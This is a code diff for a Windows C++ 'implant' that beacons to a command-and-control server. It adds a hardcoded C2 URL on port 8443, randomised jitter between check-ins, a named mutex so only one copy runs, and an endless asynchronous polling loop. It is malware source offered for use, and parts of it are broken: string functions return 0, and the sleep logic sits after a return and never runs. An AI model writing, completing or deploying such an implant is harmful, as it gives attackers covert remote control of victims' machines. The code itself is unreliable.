@@ -5,48 +5,57 @@
 #include <random>
 #include <stdexcept>
 #include <iostream>
-#include "xcore.h"
+#include <future>
+#include <string>
+#include <Windows.h>
 
 namespace implant {
-
-/* std::string initConnection() {
-    // Generate ID
-    // Make GET connection with a parameter named ID: 
-    // Receive public RSA key
-    // Authenticate
-    // Receive token
-    // set isRunning to true
-}
-*/
-
-std::string initConnection() {
-    xcore::generateID();
-    
-}
+std::string url = "http://192.168.1.147:8443/test";
+const int baseWaitTime = 5000; // 5 second
+const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
+// Calculate the final wait time with jitter
 
 bool isRunning = true;
 
-std::string beacon() {
+void beacon() {
+    while (true) {
+        // Call the beaconLogic function asynchronously and store the future object
+        std::future<void> future_result = std::async(std::launch::async, [](){
+            beaconLogic();
+        });
+
+        // Wait for the asynchronous operation to complete
+        future_result.get();
+
+    }
+}
+
+std::string beaconLogic() {
+    HANDLE hMutex;
+    // create mutex with a name so multiple instances can detect it
+    hMutex = CreateMutexA(NULL, FALSE, "BeaconMutex");
+    // check if the mutex already exists
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        // if this process created the mutex, exit the application
+        if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
+        printf("BeaconMutex already exists, beacon already running\n");
+        CloseHandle(hMutex);
+        return 0;
+        }
+    }
     while (isRunning) {
         try {
-            std::string url = "http://192.168.1.147:8443/home";
             std::cerr << url << std::endl;
             std::string response = xhttp::http_get(url);
             std::cerr << response << std::endl;
             return response;
-            // Define base wait time and max jitter
-            const int baseWaitTime = 250; // 1/4 second
-            const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
-            // Seed the random number generator
+
             std::random_device rd;
             std::mt19937 gen(rd());
             std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
-            // Generate a random jitter value
             double jitter = distrib(gen);
-
-            // Calculate the final wait time with jitter
             int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);
-            // Output the wait time with jitter
+
             std::cout << "Wait time with jitter: " << waitTimeWithJitter << " milliseconds" << std::endl;
 
             // Sleep for the calculated time
@@ -59,6 +68,10 @@ std::string beacon() {
             // If failed 5 times go to onFail()
         }
     }
+    // cleanup
+    if (hMutex)
+        CloseHandle(hMutex);
+    return 0;
     // Return a message indicating that the beacon loop exited
     return "Exited beacon loop";
 }
